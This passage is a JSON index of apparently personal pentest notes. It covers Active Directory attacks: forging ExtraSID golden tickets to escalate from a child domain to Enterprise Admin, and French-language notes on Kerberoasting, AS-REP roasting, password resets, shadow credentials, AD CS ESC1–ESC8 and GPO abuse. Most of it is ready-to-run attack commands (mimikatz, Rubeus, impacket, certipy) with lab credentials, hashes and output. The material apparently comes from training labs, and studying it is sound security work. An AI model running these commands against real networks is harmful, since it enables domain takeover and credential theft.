themselves"},{"id":"why-sidhistory-extrasid-exists","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-sidhistory-extrasid-exists","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Why SIDHistory / ExtraSID Exists","c":"The ExtraSID concept exists mainly for migrations . Example scenario: Company migration: OLD-DOMAIN.LOCAL ↓ NEW-DOMAIN.LOCAL Users move to a new domain but must retain access to old resources . Microsoft solves this with SIDHistory . User after migration: Primary SID → New domain SIDHistory → Old domain So when the user accesses an old file server: File ACL contains OLD-DOMAIN SID Access still works because the SID is present in the token"},{"id":"kerberos-pac-where-authorization-actually-happens","u":"04_forest-privilege-escalation-trust-abuse-technique.html#kerberos-pac-where-authorization-actually-happens","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"2️⃣ Kerberos PAC — where authorization actually happens","c":"What is the PAC? The Privilege Attribute Certificate (PAC) is a data structure embedded inside Kerberos tickets. It is NOT authentication data It is authorization data . PAC contains: User SID Group SIDs Privileges ExtraSIDs Domain info PAC is what Windows trusts for access decisions When a resource is accessed: Kerberos Ticket → PAC → Access Token → ACL check ACLs never query AD again."},{"id":"extrasid-the-pac-representation-of-sidhistory","u":"04_forest-privilege-escalation-trust-abuse-technique.html#extrasid-the-pac-representation-of-sidhistory","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"3️⃣ ExtraSID — the PAC representation of sidHistory","c":"What ExtraSID is ExtraSID is a field inside the PAC that holds: SIDs that should be treated exactly like group SIDs during authorization In normal operation: PAC.ExtraSids ← AD.sidHistory"},{"id":"important-equivalence-this-is-the-core","u":"04_forest-privilege-escalation-trust-abuse-technique.html#important-equivalence-this-is-the-core","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Important equivalence (THIS IS THE CORE)","c":"Windows makes NO distinction between: Group membership SIDs SIDHistory SIDs ExtraSIDs in PAC If the SID is present in the token → it grants access"},{"id":"legitimate-end-to-end-flow-normal-scenario","u":"04_forest-privilege-escalation-trust-abuse-technique.html#legitimate-end-to-end-flow-normal-scenario","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"4️⃣ Legitimate End-to-End Flow (Normal Scenario)","c":"Let’s connect everything. Step-by-step: User logs in KDC authenticates user KDC reads AD object Finds: Primary SID Group memberships sidHistory Builds PAC: PAC.Groups = Domain groups PAC.ExtraSids = sidHistory values Ticket issued Client accesses resource Resource server builds access token Token contains all SIDs ACL matches SID → access granted ✔ That is the legitimate use case"},{"id":"logic-conditions","u":"04_forest-privilege-escalation-trust-abuse-technique.html#logic-conditions","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Logic + Conditions","c":""},{"id":"parentchild-trust-must-exist-inside-the-same-forest","u":"04_forest-privilege-escalation-trust-abuse-technique.html#parentchild-trust-must-exist-inside-the-same-forest","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"1️⃣ Parent–Child Trust Must Exist (Inside the Same Forest)","c":"For the ExtraSID / child → parent Golden Ticket escalation to work, the domains must be connected like this: Forest │ └── ROOT DOMAIN INLANEFREIGHT.LOCAL │ ├── CHILD DOMAIN │ LOGISTICS.INLANEFREIGHT.LOCAL │ └── CHILD DOMAIN HR.INLANEFREIGHT.LOCAL When a child domain is created, Active Directory automatically creates a trust . Properties of this trust: ✔ Two-way ✔ Transitive ✔ Inside same forest ✔ SID filtering disabled This is the exact condition that enables the attack ."},{"id":"why-the-trust-is-required","u":"04_forest-privilege-escalation-trust-abuse-technique.html#why-the-trust-is-required","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"2️⃣ Why the Trust Is Required","c":"When the parent DC receives a ticket issued by the child domain, it checks: Was this ticket issued by a trusted domain? Because the trust exists: LOGISTICS → trusted by → INLANEFREIGHT the parent domain accepts the ticket. Without this trust: Ticket rejected"},{"id":"what-happens-during-the-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-happens-during-the-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"3️⃣ What Happens During the Attack","c":"You compromise the child domain : LOGISTICS.INLANEFREIGHT.LOCAL You obtain: Child Domain KRBTGT hash Child Domain SID Then you forge a ticket: User: attacker Domain: LOGISTICS Primary SID LOGISTICS user SID ExtraSID INLANEFREIGHT Enterprise Admin SID Because SID filtering is disabled inside the forest , the parent domain keeps the ExtraSID."},{"id":"what-the-parent-domain-controller-thinks","u":"04_forest-privilege-escalation-trust-abuse-technique.html#what-the-parent-domain-controller-thinks","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"4️⃣ What the Parent Domain Controller Thinks","c":"When the forged ticket reaches the parent DC: Step 1 Ticket signed by LOGISTICS KRBTGT Parent thinks: ✔ Issued by LOGISTICS domain controller ✔ LOGISTICS is trusted So it proceeds. Then: Step 2 Token creation Parent DC reads SIDs in the ticket: User SID Extra SID → Enterprise Admin Token built: LOGISTICS\\attacker Enterprise Admin Now the attacker effectively becomes Enterprise Admin of the forest ."},{"id":"when-this-attack-would-not-work","u":"04_forest-privilege-escalation-trust-abuse-technique.html#when-this-attack-would-not-work","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"5️⃣ When This Attack Would NOT Work","c":"This attack fails if:"},{"id":"no-trust-exists","u":"04_forest-privilege-escalation-trust-abuse-technique.html#no-trust-exists","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"❌ No trust exists","c":"Example: COMPANY.LOCAL LAB.LOCAL Two completely separate forests. Then: Ticket from LAB → rejected by COMPANY"},{"id":"sid-filtering-is-enabled","u":"04_forest-privilege-escalation-trust-abuse-technique.html#sid-filtering-is-enabled","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"❌ SID filtering is enabled","c":"External trusts normally enable SID filtering. Meaning: Foreign SIDs removed from ticket So the injected Enterprise Admin SID disappears ."},{"id":"the-key-requirement-pentester-mental-checklist","u":"04_forest-privilege-escalation-trust-abuse-technique.html#the-key-requirement-pentester-mental-checklist","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"6️⃣ The Key Requirement (Pentester Mental Checklist)","c":"For child → parent escalation : 1️⃣ Same forest 2️⃣ Parent-child trust exists 3️⃣ SID filtering disabled (default intra-forest) 4️⃣ Child domain KRBTGT compromised Then the attack works."},{"id":"windows","u":"04_forest-privilege-escalation-trust-abuse-technique.html#windows","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Windows","c":""},{"id":"step-1-dump-krbtgt-hash-child-domain-1","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-1-dump-krbtgt-hash-child-domain-1","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔍 Step 1: Dump KRBTGT Hash (Child Domain)","c":"Command: powershell mimikatz # lsadump::dcsync /user:LOGISTICS\\krbtgt Purpose: Retrieve NTLM hash of KRBTGT account to sign forged Kerberos tickets. Output: Hash NTLM: 9d765b482771505cbe97411065964d5f"},{"id":"step-2-get-child-domain-sid-1","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-2-get-child-domain-sid-1","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔍 Step 2: Get Child Domain SID","c":"Command: powershell Get-DomainSID Output: S-1-5-21-2806153819-209893948-922872689"},{"id":"step-3-get-parent-domain-enterprise-admins-group-sid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-3-get-parent-domain-enterprise-admins-group-sid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔍 Step 3: Get Parent Domain Enterprise Admins Group SID","c":"Command: Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" Output: S-1-5-21-3842939050-3880317879-2865463114-519"},{"id":"step-4-confirm-no-access-before-attack","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-4-confirm-no-access-before-attack","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🛑 Step 4: Confirm No Access (Before Attack)","c":"Command: powershell ls \\\\academy-ea-dc01.inlanefreight.local\\c$ Output: Access is denied"},{"id":"step-5-create-golden-ticket-with-extrasid-using-mimikatz","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-5-create-golden-ticket-with-extrasid-using-mimikatz","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🎟️ Step 5: Create Golden Ticket with ExtraSID Using Mimikatz","c":"Command: mimikatz kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL ` /sid:S-1-5-21-2806153819-209893948-922872689 ` /krbtgt:9d765b482771505cbe97411065964d5f ` /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt Explanation: Creates a forged TGT for hacker@LOGISTICS.INLANEFREIGHT.LOCAL . ExtraSID adds Enterprise Admin group from parent. /ptt – Inject the ticket directly into memory. Output Summary: [*] Forged a TGT for 'hacker' [*] Extra SIDs: S-1-5-21-...-519 [+] Ticket successfully submitted for current session"},{"id":"step-6-verify-ticket-injection-memory","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-6-verify-ticket-injection-memory","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"📄 Step 6: Verify Ticket Injection (Memory)","c":"Command: powershell klist Output: Client: hacker @ LOGISTICS.INLANEFREIGHT.LOCAL Server: krbtgt/LOGISTICS.INLANEFREIGHT.LOCAL Flags: forwardable renewable initial"},{"id":"step-7-access-parent-domain-dc-1","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-7-access-parent-domain-dc-1","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🗂️ Step 7: Access Parent Domain DC","c":"Command: powershell ls \\\\academy-ea-dc01.inlanefreight.local\\c$ Output: Volume in drive ... has no label. Directory of \\\\academy-ea-dc01.inlanefreight.local\\c$ Program Files, Users, Windows, etc. ✅ Access granted!"},{"id":"alternative-golden-ticket-via-rubeus","u":"04_forest-privilege-escalation-trust-abuse-technique.html#alternative-golden-ticket-via-rubeus","sec":"Forest privilege escalation / trust abuse technique","lvl":2,"t":"🧪 Alternative: Golden Ticket via Rubeus","c":""},{"id":"command","u":"04_forest-privilege-escalation-trust-abuse-technique.html#command","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🔧 Command:","c":"powershell .\\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f ` /domain:LOGISTICS.INLANEFREIGHT.LOCAL ` /sid:S-1-5-21-2806153819-209893948-922872689 ` /sids:S-1-5-21-3842939050-3880317879-2865463114-519 ` /user:hacker /ptt ✅ Successfully injects ticket with ExtraSID via Rubeus."},{"id":"step-8-dcsync-from-parent-domain-privilege-confirm","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-8-dcsync-from-parent-domain-privilege-confirm","sec":"Forest privilege escalation / trust abuse technique","lvl":2,"t":"📤 Step 8: DCSync from Parent Domain (Privilege Confirm)","c":"Command: powershell mimikatz # lsadump::dcsync /user:INLANEFREIGHT\\lab_adm Explanation: Targeting an account in the parent domain . If successful → attacker is treated as Enterprise Admin (SID spoofed!). Output: NTLM Hash of lab_adm: 663715a1a8b957e8e9943cc98ea451b6"},{"id":"linux","u":"04_forest-privilege-escalation-trust-abuse-technique.html#linux","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"Linux","c":""},{"id":"step-1-extract-krbtgt-hash-child-domain","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-1-extract-krbtgt-hash-child-domain","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"✅ Step 1: Extract KRBTGT Hash (Child Domain)","c":"bash secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt 🔍 Breakdown: just-dc-user : dump a specific user’s secrets LOGISTICS/krbtgt : KRBTGT user of child domain Output includes NTLM and Kerberos keys 🖥️ Sample Output: ruby krbtgt:502:aad3b...:9d765b482771505cbe97411065964d5f:::"},{"id":"step-2-find-child-domain-sid","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-2-find-child-domain-sid","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"✅ Step 2: Find Child Domain SID","c":"bash lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep \"Domain SID\" [*] Domain SID is: S-1-5-21-2806153819-209893948-922872689"},{"id":"step-3-find-enterprise-admins-sid-in-root-domain","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-3-find-enterprise-admins-sid-in-root-domain","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"✅ Step 3: Find Enterprise Admins SID in Root Domain","c":"bash lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 \"Enterprise Admins\" [*] Domain SID is: S-1-5-21-3842939050-3880317879-2865463114 ... 519: INLANEFREIGHT\\Enterprise Admins (SidTypeGroup) S-1-5-21-3842939050-3880317879-2865463114-519"},{"id":"step-4-create-golden-ticket-with-ticketer.py","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-4-create-golden-ticket-with-ticketer.py","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"✅ Step 4: Create Golden Ticket with ticketer.py","c":"bash ticketer.py -nthash 9d765b482771505cbe97411065964d5f \\ -domain LOGISTICS.INLANEFREIGHT.LOCAL \\ -domain-sid S-1-5-21-2806153819-209893948-922872689 \\ -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 \\ hacker 🔍 Explanation: nthash : NTLM of krbtgt (child) extra-sid : parent domain EA SID = SIDHistory field hacker : username (can be nonexistent) Output: hacker.ccache"},{"id":"step-5-set-the-environment-variable","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-5-set-the-environment-variable","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"✅ Step 5: Set the Environment Variable","c":"export KRB5CCNAME=hacker.ccache ✅ Now, your system uses the forged Kerberos ticket."},{"id":"step-6-use-psexec.py-to-get-system-shell-on-parent-dc","u":"04_forest-privilege-escalation-trust-abuse-technique.html#step-6-use-psexec.py-to-get-system-shell-on-parent-dc","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"✅ Step 6: Use psexec.py to Get SYSTEM Shell on Parent DC","c":"bash psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5 Microsoft Windows [Version 10.0.17763.107] C:\\Windows\\system32> whoami nt authority\\system 🔍 Flags: k : use kerberos no-pass : no password needed (we’re using the forged ticket)"},{"id":"automated-attack-with-raisechild.py","u":"04_forest-privilege-escalation-trust-abuse-technique.html#automated-attack-with-raisechild.py","sec":"Forest privilege escalation / trust abuse technique","lvl":3,"t":"🤖 Automated Attack with raiseChild.py","c":"🔁 What it Does: Performs the entire attack chain: Gets child krbtgt hash Builds ticket with parent EA SID Authenticates to parent DC Extracts parent domain admin credentials Launches psexec shell 🔧 Run Command: bash raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm [*] Raising LOGISTICS.INLANEFREIGHT.LOCAL to INLANEFREIGHT.LOCAL [*] Enterprise Admin SID: S-1-5-21-3842939050-3880317879-2865463114-519 [*] Getting credentials for LOGISTICS krbtgt [*] Getting credentials for INLANEFREIGHT krbtgt [*] Opening PSEXEC shell at ACADEMY-EA-DC01 C:\\Windows\\system32> whoami nt authority\\system"},{"id":"ère-étape-découverte-réseau","u":"05_ti-interne.html#ère-étape-découverte-réseau","sec":"TI interne","lvl":2,"t":"1ère étape – Découverte réseau","c":"sudo nmap -sn -n 10.200.142.0/24 -oA Ping-Sweep # Port scanning Windows nmap 10.200.69.30,31,35 -Pn -n -T5 # Pivot SSH sshuttle -r linux-admin@10.200.108.33 10.200.108.0/24 192.168.100.0/24 xfreerdp /v:za.tryhackme.com /u:kerry.murray /d:thmjmp1.za.tryhackme.com"},{"id":"bloodhound","u":"05_ti-interne.html#bloodhound","sec":"TI interne","lvl":2,"t":"BloodHound","c":"Collecte via netexec (LDAP) : nxc ldap $DC_IP -u 'Brandon_Boyd' -p '' --bloodhound -c all --dns-server $DC_IP"},{"id":"enum-acl","u":"05_ti-interne.html#enum-acl","sec":"TI interne","lvl":2,"t":"Enum ACL","c":"Recherche des objets modifiables (via bloodyAD) : bloodyad --host 10.129.37.22 --dns 10.129.37.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable"},{"id":"énumération-ldap","u":"05_ti-interne.html#énumération-ldap","sec":"TI interne","lvl":2,"t":"Énumération LDAP","c":"ldapdomaindump --user \"northbridge.corp\\\\_svrautomationsvc\" --password 'REDACTED' --outdir ldapdomaindump \"10.1.235.111\""},{"id":"domain-computers-abus-machineaccountquota","u":"05_ti-interne.html#domain-computers-abus-machineaccountquota","sec":"TI interne","lvl":2,"t":"Domain computers (abus MachineAccountQuota)","c":"# Ajout d'un compte machine via netexec (cache Kerberos) nxc smb anomaly-dc.anomaly.hsm -k --use-kcache -M add-computer -o NAME=\"TOMMYPC\" PASSWORD='Password1!' # Lire le quota ms-DS-MachineAccountQuota bloodyAD -u Brandon_Boyd -p '3edc4rfv#EDC$RFV' -d anomaly.hsm --dc-ip 10.1.111.114 \\ get object 'DC=ANOMALY,DC=HSM' --attr ms-DS-MachineAccountQuota # Ajouter un ordinateur bloodyAD -u 'Brandon_Boyd' -p '3edc4rfv#EDC$RFV' -d anomaly.hsm --dc-ip 10.1.111.114 \\ add computer tensai 'Nan2004'"},{"id":"ipc-null-session-enumération-sid","u":"05_ti-interne.html#ipc-null-session-enumération-sid","sec":"TI interne","lvl":2,"t":"IPC$ / null session → enumération SID","c":"python3 /usr/share/doc/python3-impacket/examples/lookupsid.py anonymous@10.10.55.168 | tee users.txt grep SidTypeUser users.txt | awk '{print $2}' | cut -d \"\\\\\" -f2 > users.txt # AS-REP roasting sur la liste d'utilisateurs python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -dc-ip 10.10.100.15 \\ -usersfile users.txt -no-pass vulnnet-rst.local/ # Exemple : t-skid / tj072889* smbclient -U vulnnet-rst.local/t-skid //10.10.100.15/NETLOGON # Creds dans un script VBS : a-whitehat / bNdKVkjv3RR9ht evil-winrm -i 10.10.100.15 -u a-whitehat -p \"bNdKVkjv3RR9ht\" python3 secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.100.15 evil-winrm -i 10.10.55.168 -u administrator -H \"c2597747aa5e43022a3a3049a3c3b09d\""},{"id":"kerberoasting-aveugle-blind-kerberoast","u":"05_ti-interne.html#kerberoasting-aveugle-blind-kerberoast","sec":"TI interne","lvl":2,"t":"Kerberoasting aveugle (blind kerberoast)","c":"GetUserSPNs.py -no-preauth t.spivey -usersfile valid_users.txt -dc-host 10.0.30.244 tri.lab/"},{"id":"exploit-krb5.keytab","u":"05_ti-interne.html#exploit-krb5.keytab","sec":"TI interne","lvl":2,"t":"Exploit krb5.keytab","c":"kinit -kt krb5.keytab Brandon_Boyd@ANOMALY.HSM klist export KRB5CCNAME=/tmp/krb5cc_1000 nxc smb 10.1.111.114 -u Brandon_Boyd -k --use-kcache"},{"id":"force-change-password","u":"05_ti-interne.html#force-change-password","sec":"TI interne","lvl":2,"t":"Force Change Password","c":"net rpc password \"svc_web\" 'Welcome2025!@' -U \"WELCOME.local\"/\"i.park\"%'Welcome2025!@' -S \"10.0.30.32\""},{"id":"generic-all-abus-complet-sur-un-objet","u":"05_ti-interne.html#generic-all-abus-complet-sur-un-objet","sec":"TI interne","lvl":2,"t":"Generic All (abus complet sur un objet)","c":"Changement de mot de passe d’un utilisateur ciblé via bloodyAD : bloodyAD --host \"10.1.8.188\" -d \"DC01.hacksmarter.local\" -u \"alt.svc\" -p \"REDACTED\" \\ set password \"yorinobu\" \"newP@ssword2022\""},{"id":"t1558.003-targeted-kerberoasting-moins-bruyant-que-le-changement-de-mot-de-passe","u":"05_ti-interne.html#t1558.003-targeted-kerberoasting-moins-bruyant-que-le-changement-de-mot-de-passe","sec":"TI interne","lvl":3,"t":"T1558.003 – Targeted Kerberoasting (moins bruyant que le changement de mot de passe)","c":"git clone https://github.com/ShutdownRepo/targetedKerberoast.git ./targetedKerberoast.py --dc-ip '192.168.1.8' -v -d 'ignite.local' -u 'nishant' -p 'Password@1' Variante PowerView (Windows) : positionner un SPN sur la cible, demander le TGS, puis cracker hors-ligne avec Hashcat."},{"id":"t1110.001-changement-de-mot-de-passe-plusieurs-méthodes","u":"05_ti-interne.html#t1110.001-changement-de-mot-de-passe-plusieurs-méthodes","sec":"TI interne","lvl":3,"t":"T1110.001 – Changement de mot de passe (plusieurs méthodes)","c":"# Linux net rpc (Samba) net rpc password vipin 'Password@987' -U ignite.local/nishant%'Password@1' -S 192.168.1.8 # bloodyAD bloodyAD --host \"192.168.1.8\" -d \"ignite.local\" -u \"nishant\" -p \"Password@1\" set password \"vipin\" \"Password@9876\" # rpcclient rpcclient -U ignite.local/nishant 192.168.1.8 # puis: setuserinfo vipin 23 Ignite@987 # Windows net net user Vipin Password@1234 /domain # PowerView Set-DomainUserPassword -Identity 'vipin' -AccountPassword $NewPassword"},{"id":"genericwrite-targeted-kerberoast-shadow-credentials","u":"05_ti-interne.html#genericwrite-targeted-kerberoast-shadow-credentials","sec":"TI interne","lvl":2,"t":"GenericWrite → Targeted Kerberoast / Shadow Credentials","c":"python3 targetedKerberoast.py -v --dc-ip 10.0.27.56 -d hacksmarter.local -u yorinobu -p 'Password@987' --request-user soulkiller.svc # Shadow Credentials (écriture sur msDS-KeyCredentialLink) via Certipy certipy shadow auto -u 'yorinobu@hacksmarter.local' -p 'newP@ssword2022' -account 'soulkiller.svc' -dc-ip 10.1.8.188"},{"id":"backup-operators-locally","u":"05_ti-interne.html#backup-operators-locally","sec":"TI interne","lvl":2,"t":"Backup Operators (locally)","c":"impacket-reg ghill_sa:'P@ssw0rd!'@10.1.217.65 backup -o 'C:/users/ghill_sa/desktop'"},{"id":"templates-ad-cs-rappel","u":"05_ti-interne.html#templates-ad-cs-rappel","sec":"TI interne","lvl":2,"t":"Templates AD CS (rappel)","c":"certipy-ad find -u 'svc_ca' -p 'Welcome2025!@' -dc-ip \"10.0.30.32\" -vulnerable -enable nxc ldap anomaly-dc.anomaly.hsm -k --use-kcache -M certipy-find # ESC1 certipy-ad req -u 'aarti@ignite.local' -p 'Password@1' -dc-ip 192.168.1.48 -ca ignite-DC1-CA -target 'dc.ignite.local' -template 'Custom_ESC1' -upn 'administrator@ignite.local' certipy-ad auth -pfx administrator.pfx -dc-ip 192.168.1.48"},{"id":"ca-volée-golden-certificate","u":"05_ti-interne.html#ca-volée-golden-certificate","sec":"TI interne","lvl":3,"t":"CA volée → Golden Certificate","c":"certipy ca -backup -ca \"tri-CA\" -username \"m.pearson@tri.lab\" -password \"REDACTED\" -dc-ip \"10.0.30.244\" -target SWIM-SRV certipy forge -ca-pfx \"CA.pfx\" -upn \"administrator@corp.local\" -subject \"CN=Administrator,CN=Users,DC=CORP,DC=LOCAL\" certipy forge -ca-pfx tri-CA.pfx -upn j.reed_adm@tri.lab -sid S-1-5-21-542797205-3952052766-1175187200-1109 certipy-ad auth -pfx j.reed_adm_forged.pfx -ldap-shell -dc-ip 10.1.220.10 Le détail complet ESC1→ESC8 est documenté dans la section AD CS ci-dessous."},{"id":"ad-cs-énumération-et-exploitation-esc1-esc8","u":"05_ti-interne.html#ad-cs-énumération-et-exploitation-esc1-esc8","sec":"TI interne","lvl":2,"t":"AD CS – Énumération et exploitation (ESC1 → ESC8)","c":""},{"id":"énumération-de-linfrastructure-ad-cs","u":"05_ti-interne.html#énumération-de-linfrastructure-ad-cs","sec":"TI interne","lvl":3,"t":"Énumération de l’infrastructure AD CS","c":"Deux outils : Certipy (Python) et Certify (C#). Ils interrogent LDAP pour cartographier les autorités de certification, les templates et leurs propriétés (droits enroll / autoenroll , contraintes Subject Name , EKU). certipy find -u \"$USER\" -p \"$PASSWORD\" -dc-ip \"$DC_IP\" -vulnerable -enable Certify.exe find /vulnerable Les résultats peuvent être importés dans BloodHound pour corréler AD CS avec les chemins de privilèges."},{"id":"esc1-usurpation-via-san-arbitraire","u":"05_ti-interne.html#esc1-usurpation-via-san-arbitraire","sec":"TI interne","lvl":3,"t":"ESC1 – Usurpation via SAN arbitraire","c":"Le template autorise le demandeur à définir lui-même le SAN ( mspki-certificate-name-flag = EnrolleeSuppliesSubject ), avec enrollment ouvert, sans Manager Approval, EKU Client Authentication . certipy req -u \"$USER@$DOMAIN\" -p \"$PASS\" -dc-ip \"$DC_IP\" -target \"$ADCS_HOST\" \\ -ca '<CA NAME>' -template 'ESC1' -upn 'administrator@essos.local' openssl pkcs12 -in administrator.pfx -clcerts -nokeys -out administrator.pem certipy auth -pfx administrator.pfx -dc-ip 10.6.10.12"},{"id":"esc2-certificat-any-purpose","u":"05_ti-interne.html#esc2-certificat-any-purpose","sec":"TI interne","lvl":3,"t":"ESC2 – Certificat Any Purpose","c":"Template avec EKU Any Purpose (ou aucun EKU) → certificat passe-partout utilisable comme Certificate Request Agent . certipy req -u \"$USER@$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -template ESC2 -ca \"$CA-NAME\" certipy req -u \"$USER@$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -template User \\ -ca \"$CA-NAME\" -on-behalf-of 'essos\\administrator' -pfx khal.drogo.pfx"},{"id":"esc3-deux-templates-request-agent","u":"05_ti-interne.html#esc3-deux-templates-request-agent","sec":"TI interne","lvl":3,"t":"ESC3 – Deux templates (Request Agent)","c":"certipy req -u \"$USER@$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -template ESC3-CRA -ca \"<CA-NAME>\" certipy req -u \"$USER\" -p \"$PASS\" -target \"$ADCS_HOST\" -template ESC3 \\ -ca ESSOS-CA -on-behalf-of 'essos\\administrator' -pfx esc2.pfx"},{"id":"esc4-permissions-faibles-sur-un-template","u":"05_ti-interne.html#esc4-permissions-faibles-sur-un-template","sec":"TI interne","lvl":3,"t":"ESC4 – Permissions faibles sur un template","c":"Détection BloodHound + reconfiguration façon ESC1 : MATCH p=shortestPath((g)-[:GenericAll|GenericWrite|Owns|WriteDacl|WriteOwner*1..]->(n:GPO)) WHERE g<>n AND n.type = 'Certificate Template' AND n.Enabled = true RETURN p certipy template -u \"$USER\" -p \"$PASS\" -template ESC4 -write-default-configuration -dc-ip 10.6.10.12 certipy req -u \"$USER@$DOMAIN\" -p \"$PASS\" -dc-ip \"$DC_IP\" -target \"$ADCS_HOST\" -ca 'ESSOS-CA' -template 'ESC4' -upn 'administrator@essos.local' # Restauration après test certipy template -u \"$USER@$DOMAIN\" -p \"$PASS\" -template ESC4 -write-configuration <backup-ESC4-file>.json -dc-ip 10.6.10.12"},{"id":"esc5-golden-certificate-compromission-ca","u":"05_ti-interne.html#esc5-golden-certificate-compromission-ca","sec":"TI interne","lvl":3,"t":"ESC5 – Golden Certificate (compromission CA)","c":"certipy ca -backup -u 'Administrator' -hashes ':<redacted>' -ca 'ESSOS-CA' -target <CA-SERVER-IP> certipy forge -ca-pfx ESSOS-CA.pfx -upn administrator@essos.local -crl 'ldap:///'"},{"id":"esc6-editf_attributesubjectaltname2","u":"05_ti-interne.html#esc6-editf_attributesubjectaltname2","sec":"TI interne","lvl":3,"t":"ESC6 – EDITF_ATTRIBUTESUBJECTALTNAME2","c":"certipy req -u \"$USER@$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -template User -ca ESSOS-CA -upn administrator@essos.local -dc-ip \"$DC_IP\" # Remédiation certutil -setreg policy\\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2 net stop certsvc && net start certsvc Fortement atténué depuis mai 2022 (KB5014754 / CVE-2022-26923 « Certifried »)."},{"id":"esc7-manage-ca-subca","u":"05_ti-interne.html#esc7-manage-ca-subca","sec":"TI interne","lvl":3,"t":"ESC7 – Manage CA (SubCA)","c":"certipy ca -u 'khal.drogo'@\"$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -ca \"ESSOS-CA\" -enable-template 'SubCA' -dc-ip \"$DC_IP\" certipy ca -u \"khal.drogo\"@\"$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -dc-ip 10.6.10.12 -ca 'ESSOS-CA' -add-officer \"khal.drogo\" certipy ca -u \"khal.drogo\"@\"$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -dc-ip 10.6.10.12 -ca 'ESSOS-CA' -issue-request '58' certipy req -u \"khal.drogo\"@\"$DOMAIN\" -p \"$PASS\" -target \"$ADCS_HOST\" -template SubCA -ca ESSOS-CA -dc-ip 10.6.10.12 -retrieve '58'"},{"id":"esc8-ntlm-relay-sur-web-enrollment","u":"05_ti-interne.html#esc8-ntlm-relay-sur-web-enrollment","sec":"TI interne","lvl":3,"t":"ESC8 – NTLM Relay sur Web Enrollment","c":"certipy relay -target http://10.6.10.23 -template 'DomainController' nxc smb <DC-IP> -M coerce_plus -o LISTENER=\"$ATTACKER_IP\" certipy auth -pfx domain-controller.pfx -dc-ip 10.6.10.12 secretsdump -just-dc-user administrator -hashes :\"<NT_HASH>\" \"$DOMAIN\"/\"<DC_NAME>$\"@\"10.6.10.12\" Remédiation : désactiver le Web Enrollment inutile, activer EPA (HTTPS), désactiver NTLM sur les serveurs AD CS. Voir KB5005413."},{"id":"gpo-abuse-privilege-escalation","u":"05_ti-interne.html#gpo-abuse-privilege-escalation","sec":"TI interne","lvl":2,"t":"GPO Abuse – Privilege Escalation","c":"# Ajoute l'utilisateur \"john\" aux administrateurs locaux (mot de passe : H4x00r123..) pygpoabuse.py hsm.local/bbarkinson -hashes :<redacted> -gpo-id \"526CDF3A-10B6-4B00-BCFA-36E59DCD71A2\" -dc-ip 10.1.50.226 -f # Nettoyage 